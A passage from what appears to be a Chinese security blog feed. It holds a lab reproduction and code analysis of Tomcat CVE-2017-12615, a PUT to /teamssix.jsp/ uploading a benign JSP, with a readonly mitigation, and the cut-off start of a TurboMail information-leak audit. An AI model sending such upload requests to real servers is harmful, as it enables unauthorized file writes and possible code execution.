  </entry>
  
  <entry>
    <title>【代码审计】Tomcat 任意文件写入 CVE-2017-12615</title>
    <link href="https://www.teamssix.com/211216-172616.html"/>
    <id>https://www.teamssix.com/211216-172616.html</id>
    <published>2021-12-16T09:26:16.000Z</published>
    <updated>2021-12-16T09:38:16.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><p>直接 Docker 搭建即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> /vulhub/tomcat/CVE-2017-12615<span class="token function">sudo</span> docker-compose build<span class="token function">sudo</span> docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>直接使用 PUT 发起请求就可以上传任意文件，比如向 /teamssix.jsp/ 发起请求</p><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;teamssix.jsp&#x2F; HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeContent-Length: 26&lt;%out.print(&quot;TeamsSix&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 201 Content-Length: 0Date: Wed, 15 Dec 2021 07:19:29 GMTConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>服务端返回 201 说明创建成功，访问 /teamssix.jsp 可以看到文件成功被上传</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;teamssix.jsp HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 Set-Cookie: JSESSIONID&#x3D;128419889W27F6C930EF27082B98D9FD; Path&#x3D;&#x2F;; HttpOnlyContent-Type: text&#x2F;html;charset&#x3D;ISO-8859-1Content-Length: 8Date: Wed, 15 Dec 2021 07:19:35 GMTConnection: closeTeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112161721745.png"></p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>Tomcat 在处理时有两个默认的 Servlet，分别为 DefaultServlet 和 JspServlet，具体配置如下：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.catalina.servlets.DefaultServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>listings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>…… <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.jasper.servlet.JspServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>fork<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>xpoweredBy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>……    <span class="token comment">&lt;!-- The mapping for the default servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- The mappings for the JSP servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jspx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从配置文件里可以看到对于后缀为 .jsp 和 .jspx 的请求由 JspServlet 处理，而其他的请求则由 DefaultServlet 处理。</p><p>所以当请求 /teamssix.jsp 时将会由 JspServlet 处理，无法触发漏洞；而请求 /teamssix.jsp/ 将绕过这个限制，交由 DefaultServlet 处理，这时就可以触发漏洞了。</p><p>要想实现一个 Servlet，就需要继承 HTTPServlet，找到 HTTPServlet 文件为 /tomcat/lib/servlet-api.jar!/javax/servlet/http/HttpServlet.class</p><p>在 HTTPServlet 中找到 doPut 方法，然后找到 DefaultServlet 里重写的 doPut 方法路径为tomcat/lib/catalina.jar!/org/apache/catalina/servlets/DefaultServlet.class</p><p>查看 DefaultServlet 的 doPut 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRelativePath</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebResource</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultServlet<span class="token punctuation">.</span>Range</span> range <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseContentRange</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> resourceInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>range <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">File</span> contentFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">executePartialPut</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> range<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>                resourceInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>contentFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resourceInputStream <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">204</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resourceInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 2 行可以看到首先判断 readOnly 是否为真，如果为真则返回 403，因此可以直接把 web.xml 里的 DefaultServlet 的 readonly 由原来的 false 改为 true 就能防御这个漏洞了。</p><p>继续回到 DefaultServlet.class 里，在 DefaultServlet.class 里可以看到有个 write 函数，通过这个 write 函数代码跟踪到 tomcat/lib/catalina.jar!/org/apache/catalina/webresources/DirResourceSet.class 里的 write 函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">InputStream</span> is<span class="token punctuation">,</span> <span class="token keyword">boolean</span> overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkPath</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"dirResourceSet.writeNpe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isReadOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> dest <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> webAppMount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getWebAppMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dest <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dest <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dest<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">StandardCopyOption</span><span class="token punctuation">.</span>REPLACE_EXISTING<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行到<code>dest = this.file(path.substring(webAppMount.length()), false); </code> 时，path 会作为参数传入，执行 file 方法，file 方法部分代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">File</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> mustExist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>fileBase<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行到 <code>File file = new File(this.fileBase, name); </code>时，会实例化一个 File 对象，fileBase 是 Web 应用所在的绝对路径。</p><p>这里的 name 就是传入的文件名，比如 /teamssix.jsp/，在 File 实例化的过程中会处理掉 /，因此 /teamssix.jsp/ 会变成  /teamssix.jsp</p><p>所以通过 PUT 请求，利用 /teamssix.jsp/ 可以达到任意文件上传的目的。</p><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x00-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x00 环境搭建&quot;&gt;&lt;/a&gt;0x00 环境搭建&lt;/h1&gt;&lt;p&gt;直接 Docker 搭建即可&lt;/p&gt;
&lt;pre class=&quot;line-number</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】敏感信息泄露</title>
    <link href="https://www.teamssix.com/211215-131111.html"/>
    <id>https://www.teamssix.com/211215-131111.html</id>
    <published>2021-12-15T05:11:11.000Z</published>
    <updated>2021-12-15T05:57:22.590Z</updated>
    
    <content type="html"><![CDATA[<p>这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。</p><p>已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm</p><p>打开 TurboMail 的安装目录，在 turbomail\web\webapps\ROOT\WEB-INF 下找到 web.xml 文件，发现以下配置信息</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/mailmain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>turbomail.web.MailMain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从这些配置信息不难看出 /mailmain 路径对应的 servlet-name 是 mailmaini，而 mailmaini 对应的 servlet-class 是 turbomail.web.MailMain</p><p>那么这里就需要找到 turbomail.web.MailMain 类进行分析，假设这个类是在 turbomail.jar 文件里，通过搜索在 /turbomail/web/webapps/ROOT/WEB-INF/lib/ 下找到 turbomail.jar 文件</p><p>利用 jd-gui 或者 Intellij IDEA 对 turbomail.jar 进行反编译，可以在 turbomail/web/ 文件夹内找到 MailMain.java 文件，这说明之前的假设是正确的。</p><p>在 195 行可以看到接收了 type 参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">195</span>  <span class="token class-name">String</span> type <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">196</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">197</span>      type <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token number">198</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 543 行可以看到如果 type 参数为 pm，则执行 PMAdmin 的 show 